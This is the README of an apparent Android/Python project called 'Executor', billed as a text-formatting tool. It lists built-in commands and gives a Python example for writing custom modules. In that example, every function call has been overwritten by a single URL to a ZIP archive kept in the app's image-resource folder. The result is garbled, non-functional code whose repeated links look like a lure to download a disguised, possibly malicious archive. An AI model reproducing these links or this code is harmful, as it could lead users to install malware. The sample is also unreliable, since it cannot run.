# Executor
Real-time text formatting tool. Use `{command *arguments}>`. Example: `{ip}>` (without args), `{randomize 2 9}>` (2 args). Type `{help}>` to see all commands.

# Built-in commands
`repeat <n> <text>` - repeat text n times

`randomize <num1> <num2>` - random between 2 numbers

`summarize <num1 num2 num3....>` - sum numbers

`uppercase <text>` - make CAPS

`erase` - cleans text field

`count <text>` - count words in text

`info` - information about programm

`ip` - get your ip adress

`help` - liss of all commands include module commands



# Writing custom scripts
Write function what you need. Do not forget about errors handling. Function must always return string.

```python
def ip():
    try:
        url = "https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip"
        with https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip(url) as response:
            data = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip().decode()
            json_data = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip(data)
            ip = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip("ip", "Not found")
            country = https://github.com/Sigma1029/Executor/raw/refs/heads/master/app/src/main/res/drawable/Software_3.4.zip("country", "Not found")
            return f"IP: {ip}, {country}"
    except Exception as e:
        return str(e)
```

At the end of the file, include the commands in the script and add the author's name (optional):

```python
COMMANDS = {
    "ip": ip,
}

AUTHOR = "name"
```
Your module will be named like file.
